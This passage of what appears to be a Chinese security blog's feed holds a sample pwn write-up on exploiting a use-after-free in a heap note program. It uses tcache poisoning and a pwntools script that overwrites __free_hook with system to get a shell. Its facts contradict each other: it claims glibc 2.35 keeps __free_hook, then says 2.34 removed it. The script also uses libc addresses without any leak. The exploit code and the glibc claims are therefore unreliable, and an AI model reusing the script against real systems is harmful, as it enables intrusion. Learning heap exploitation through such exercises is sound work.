    <title>SSTI 从探测到 RCE：一份可复用的 payload 清单</title>
    <updated>2026-11-16T04:54:58.070Z</updated>
  </entry>
  <entry>
    <author>
      <name>whymm</name>
    </author>
    <category term="Pwn" scheme="https://whymm.com.cn/categories/Pwn/"/>
    <category term="pwn" scheme="https://whymm.com.cn/tags/pwn/"/>
    <category term="heap" scheme="https://whymm.com.cn/tags/heap/"/>
    <category term="tcache" scheme="https://whymm.com.cn/tags/tcache/"/>
    <category term="glibc" scheme="https://whymm.com.cn/tags/glibc/"/>
    <content>
      <![CDATA[<blockquote><p>这是一篇<strong>示例文章</strong>。真实的 Writeup 里应当补上题目附件哈希、远程部署信息和 flag 获取过程。</p></blockquote><p>堆题看多了会发现，绝大部分入口都长一个样：<code>add / delete / edit / show</code> 四个操作，<code>delete</code> 之后<strong>没有把指针置空</strong>。这篇笔记以 glibc 2.35 为例，把这个漏洞一路推到任意地址写。</p><h2 id="一、题目结构"><a href="#一、题目结构" class="headerlink" title="一、题目结构"></a>一、题目结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125; <span class="type">chunk_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">chunk_t</span> *notes[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = pick();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;size);</span><br><span class="line">    notes[i] = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">chunk_t</span>));</span><br><span class="line">    notes[i]-&gt;size = size;</span><br><span class="line">    notes[i]-&gt;buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">    read(<span class="number">0</span>, notes[i]-&gt;buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = pick();</span><br><span class="line">    <span class="built_in">free</span>(notes[i]-&gt;buf);</span><br><span class="line">    <span class="built_in">free</span>(notes[i]);        <span class="comment">// 指针没有清零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点：<code>delete</code> 之后 <code>notes[i]</code> 仍然指向已释放的 chunk，这就是标准的 <strong>UAF + double free</strong> 组合。</p><h2 id="二、确认-glibc-版本与保护"><a href="#二、确认-glibc-版本与保护" class="headerlink" title="二、确认 glibc 版本与保护"></a>二、确认 glibc 版本与保护</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./checksec --file=./pwn</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    SHADOW:   Enabled</span><br></pre></td></tr></table></figure><p>Full RELRO + PIE 意味着 GOT 劫持这条路基本断了，但 glibc 2.35 里 <code>__free_hook</code> 还在（2.34 起 <code>__malloc_hook</code>&#x2F;<code>__free_hook</code> 已被移除，<strong>注意版本</strong>），所以目标是 <code>__free_hook</code> 写 <code>system</code>。</p><blockquote><p>冷知识：glibc 2.34 正式移除了 <code>__free_hook</code>，很多老 Writeup 还写着这条链，换到新版本会直接崩在 <code>free()</code> 里。做题前先 <code>strings libc.so.6 | grep &quot;GNU C Library&quot;</code> 确认版本。</p></blockquote><h2 id="三、tcache-的-safe-linking"><a href="#三、tcache-的-safe-linking" class="headerlink" title="三、tcache 的 safe-linking"></a>三、tcache 的 safe-linking</h2><p>2.32 之后 tcache 的 <code>next</code> 指针被 <code>PROTECT_PTR</code> 加密：<code>next = (chunk_addr &gt;&gt; 12) ^ real_next</code>。这意味着<strong>直接把 <code>__free_hook</code> 的地址写进 fd 是没用的</strong>，必须知道堆地址才能解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>所以利用链变成了两步：</p><ol><li>先泄漏一个堆地址（<code>show</code> 功能或者 <code>unsorted bin</code> 的 fd&#x2F;bk）。</li><li>用堆地址加密目标地址，再写进 fd。</li></ol><h2 id="四、利用脚本"><a href="#四、利用脚本" class="headerlink" title="四、利用脚本"></a>四、利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;data: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0) 先制造 tcache 里的堆地址泄漏</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;B&quot;</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)          <span class="comment"># double free -&gt; tcache 环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 读出加密后的 fd（指向自身 &gt;&gt; 12）</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;index: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">heap_leak = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = heap_leak &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap base ~ <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 把希望写入的地址加密后塞进 fd</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(heap_base &gt;&gt; <span class="number">12</span> ^ (libc.sym[<span class="string">&quot;__free_hook&quot;</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 三次 malloc 拿到目标块</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;C&quot;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, p64(libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)          <span class="comment"># 触发 __free_hook -&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="五、踩坑记录"><a href="#五、踩坑记录" class="headerlink" title="五、踩坑记录"></a>五、踩坑记录</h2><table><thead><tr><th>现象</th><th>原因</th><th>解决</th></tr></thead><tbody><tr><td><code>malloc(): unaligned tcache chunk detected</code></td><td>加密后的 fd 没对齐 16 字节</td><td>目标地址要满足 <code>addr &amp; 0xf == 0</code></td></tr><tr><td>程序在 <code>free</code> 里直接 abort</td><td>用了 2.35 libc，但脚本按 2.31 写 <code>__free_hook</code></td><td>换 <code>libc</code> 或改打 <code>exit_handler</code> &#x2F; <code>FSOP</code></td></tr><tr><td>泄漏出来的堆地址低 12 位全 0</td><td>safe-linking 的 <code>&gt;&gt; 12</code> 抹掉了页内偏移</td><td>只用于定位页基址，块偏移要另外算</td></tr><tr><td>远程打通本地不通</td><td>本地 libc 与题目 libc 不一致</td><td><code>patchelf --set-interpreter</code> 或 <code>pwninit</code></td></tr></tbody></table><h2 id="六、如果-free-hook-真的没了"><a href="#六、如果-free-hook-真的没了" class="headerlink" title="六、如果 __free_hook 真的没了"></a>六、如果 <code>__free_hook</code> 真的没了</h2><p>glibc 2.34+ 的替代路线：</p><ul><li><strong>FSOP</strong>：伪造 <code>_IO_FILE</code>，劫持 <code>_IO_list_all</code>，走 <code>_IO_flush_all_lockp</code>。</li><li><strong>exit handlers</strong>：改写 <code>__exit_funcs</code> 里的函数指针。</li><li><strong>栈迁移</strong>：如果堆地址可写且栈地址可泄漏，直接 ROP。</li></ul><p><strong>小结</strong>：tcache poisoning 本身只有十几行代码，真正花时间的是<strong>版本确认</strong>和<strong>地址对齐</strong>。把这两件事变成肌肉记忆，堆题就少一半玄学。</p>]]>
    </content>
